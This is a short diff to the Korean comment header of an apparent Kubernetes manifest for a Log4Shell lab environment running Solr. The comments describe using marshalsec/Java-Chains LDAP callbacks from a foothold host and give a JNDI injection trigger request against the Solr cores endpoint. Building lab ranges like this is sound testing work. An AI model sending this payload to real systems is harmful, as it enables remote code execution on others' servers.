@@ -3,7 +3,7 @@
 #   ${jndi:ldap://...} 로 원격 클래스를 바로 로드 → RCE. (Log4j 자체는 라이브러리라 Solr 로 시연.)
 #
 # ※ 콜백 LDAP/클래스 서버는 '공격자 제어'라야 악성 클래스를 서빙한다 → 환경이 제공하지 않는다.
-#   공격 하네스가 corp-ext 발판에서 marshalsec / Java-Chains LDAP+HTTP 를 띄워 섬 내부로 콜백한다
+#   공격 하네스가 corp-ext 발판에서 marshalsec / Java-Chains LDAP+HTTP 를 띄워 서버 내부로 콜백한다
 #   (인터넷 없이 재현). 발판·콜백 도구 배선은 공격 하네스 통합 단계의 몫.
 #   트리거 예시: GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}
 apiVersion: apps/v1
